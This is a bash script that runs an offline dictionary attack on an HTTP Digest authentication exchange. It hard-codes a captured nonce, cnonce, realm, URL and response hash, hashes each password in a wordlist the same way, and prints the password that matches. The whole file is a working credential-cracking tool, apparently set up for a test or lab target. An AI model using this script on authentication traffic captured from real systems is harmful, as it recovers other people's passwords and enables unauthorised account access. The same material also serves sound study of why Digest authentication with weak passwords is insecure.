#!/bin/bash

#Color constants
RED='\033[0;31m'
GRN='\033[0;32m'
NC='\033[0m' 
path=/root/words.txt
username=test
password=test
realm=digest-realm
method=GET
url=/Auth/digest-authentication
nonce=MTUzOTMxMTQ4Nzk3Nzo2NzNkYzQ2MjlmMDM0ZDNlMDcwMGQxN2VjZjg4NWI2YQ==
nc=00000002
cnonce=760a2297807a0a51
qop=auth
response=d41f6f6cf5afda0e981905711808ce37


clear
echo "************************************************"
echo " 		      Digest Bruteforce              *"
echo "************************************************"
echo "Looking for response: $response"
while IFS= read -r line
do
  hash1="$(echo -n $username:$realm:$line | md5sum | awk '{print $1}')"
#  echo hash1: $hash1
  hash2="$(echo -n $method:$url | md5sum | awk '{print $1}')"
#  echo hash2: $hash2
  calculated="$(echo -n $hash1:$nonce:$nc:$cnonce:$qop:$hash2 | md5sum | cut -d " " -f1)"
#  echo calculated: $response
  if [ "$calculated" == "$response" ]
	then
		echo -e "${GRN}Password: $line ${NC} -> ${GRN}Calculated: $calculated ${NC}== ${GRN}Response: $response${NC}"
		break;
	else
		echo -e "${RED}Password: $line ${NC} -> ${RED}Calculated: $calculated ${NC}!= ${RED}Response: $response${NC}"
  fi
done < "$path"




